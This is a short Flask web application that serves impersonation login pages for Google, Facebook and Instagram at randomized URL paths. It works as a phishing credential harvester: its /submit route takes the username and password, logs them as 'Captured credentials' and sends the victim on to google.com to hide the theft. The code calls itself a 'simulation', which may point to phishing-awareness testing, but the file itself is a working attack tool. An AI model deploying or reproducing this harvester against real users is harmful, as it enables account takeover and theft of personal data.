import json
import os
from flask import Flask, render_template, request, abort, redirect

app = Flask(__name__)

PATHS_FILE = "randomized_paths.json"

def load_randomized_paths():
    if os.path.exists(PATHS_FILE):
        with open(PATHS_FILE, "r") as file:
            return json.load(file)
    return {}

@app.route('/<random_path>')
def simulate(random_path):
    # Reload the paths from the file
    randomized_paths = load_randomized_paths()
    print(randomized_paths)
    target = randomized_paths.get(random_path)

    if not target:
        abort(404)

    if target == "google":
        return render_template('simulate.html', target="Google")
    elif target == "facebook":
        return render_template('facebook.html', target="Facebook")
    elif target == "instagram":
        return render_template("instagram.html", target="Instagram")
    else:
        return f"Simulation for {target} is not implemented yet.", 404

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    print(f"Captured credentials -> Username: {username}, Password: {password}")
    return redirect("https://www.google.com")

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0")
